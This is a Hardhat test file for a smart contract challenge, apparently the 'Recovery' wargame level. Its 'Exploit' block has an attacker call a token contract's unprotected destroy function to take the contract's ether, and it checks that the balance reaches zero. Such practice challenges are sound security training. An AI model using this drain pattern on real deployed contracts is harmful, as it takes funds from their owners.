const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Recovery', function () {

    let deployer, attacker;
    
    before(async () =>{
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const network = await ethers.provider.getNetwork();
        const chainID = network.chainId
        
        if (chainID == 5){ // goerli testnet
            /** connect to Dapp in goerli **/
            [attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('Recovery');
            this.target = ContractFactory.attach("");
            const SimpleTokenFactory = await ethers.getContractFactory('SimpleToken');
            this.token = SimpleTokenFactory.attach(""); // find the address from explorer
        } else { // local network - hardhat  
            /** local test **/
            [deployer, attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('Recovery', deployer);
            this.target = await ContractFactory.deploy();
            const SimpleTokenFactory = await ethers.getContractFactory('SimpleToken', deployer);
            this.token = await SimpleTokenFactory.deploy("STK", deployer.address, ethers.utils.parseEther("0.001","ether"));
        }
    });

    it('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        let destroyTX = await this.token.connect(attacker).destroy(attacker.address); await destroyTX.wait();
        console.log(`\t ether in token contract balance: ${await ethers.provider.getBalance(this.token.address)}`);
    }).timeout(0);

    after(async () => {
        /** SUCCESS CONDITIONS */
        expect(parseInt(await ethers.provider.getBalance(this.token.address))).to.be.eq(0);
    });
});